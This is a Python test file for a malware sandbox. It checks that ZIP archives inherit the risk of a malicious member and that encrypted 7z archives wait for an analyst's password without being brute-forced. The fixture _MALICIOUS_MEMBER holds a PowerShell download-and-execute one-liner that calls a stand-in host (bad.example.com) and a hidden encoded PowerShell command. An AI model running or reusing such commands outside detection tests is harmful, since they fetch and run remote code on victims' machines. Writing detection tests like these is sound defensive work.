"""Archive handling: contents inherit risk; encryption parks the job, never cracked.

Note on the encrypted-archive case: the Python standard library can *read* a
password-protected ZIP but cannot *write* one, and no AES-ZIP writer (pyzipper)
is installed. The encrypted container is therefore built as a 7-Zip archive with
``py7zr`` (already a dependency). The engine treats every encrypted container the
same way — it raises ``PasswordRequired`` and the pipeline parks the job — so the
security behaviour under test (no brute force, park-and-resume) is exactly the
same as for an encrypted ZIP.
"""
from __future__ import annotations

import io
import zipfile

from app.engine import pipeline
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

# A short PowerShell one-liner that scores as a risk on its own.
_MALICIOUS_MEMBER = (
    b"IEX ((New-Object Net.WebClient).DownloadString('http://bad.example.com/x.ps1'))\n"
    b"powershell -w hidden -enc SQBFAFgA\n"
)


def _analyse(db, name: str, data: bytes, password: str | None = None) -> SandboxJob:
    stored = store_bytes(data)
    job = pipeline.new_job(db, stored, original_name=name)
    db.commit()
    pipeline.run(db, job, password=password)
    db.commit()
    return job


def _children(db, job: SandboxJob) -> list[SandboxJob]:
    return db.query(SandboxJob).filter(SandboxJob.parent_job_id == job.id).all()


def test_zip_lists_members_and_inherits_worst_member_risk(db):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("dropper.ps1", _MALICIOUS_MEMBER)
        zf.writestr("readme.txt", b"totally harmless\n")

    job = _analyse(db, "bundle.zip", buf.getvalue())

    assert job.status == JobStatus.COMPLETED
    assert job.family == "archive"

    # Every member is listed in the archive facts.
    members = {m["name"] for m in job.analysis["archive"]["facts"]["members"]}
    assert "dropper.ps1" in members
    assert "readme.txt" in members

    # The malicious member was promoted to a child job and scored on its own.
    children = _children(db, job)
    by_name = {c.original_name: c for c in children}
    assert "dropper.ps1" in by_name
    assert by_name["dropper.ps1"].final_score >= 30

    # The archive inherits its worst member's risk: a clean container around a
    # dropper does not read as clean.
    signal_ids = {
        s["id"]
        for payload in job.analysis.values()
        if payload.get("ran")
        for s in payload.get("signals", [])
    }
    assert "archive.malicious_member" in signal_ids
    assert job.risk_level != "low"
    assert job.final_score >= 30


def test_encrypted_archive_parks_and_is_not_brute_forced(db):
    import py7zr

    buf = io.BytesIO()
    with py7zr.SevenZipFile(buf, "w", password="s3cret") as zf:
        zf.writestr(_MALICIOUS_MEMBER.decode(), "inner.ps1")
    data = buf.getvalue()

    # Submitted with no password: the job parks itself and refuses to guess.
    job = _analyse(db, "locked.7z", data)
    assert job.status == JobStatus.AWAITING_PASSWORD
    # Nothing was extracted or analysed — no brute force, no member jobs.
    assert _children(db, job) == []

    # The analyst supplies the password: analysis resumes to completion.
    resumed = pipeline.resume_with_password(db, job, "s3cret")
    db.commit()
    assert resumed.status == JobStatus.COMPLETED
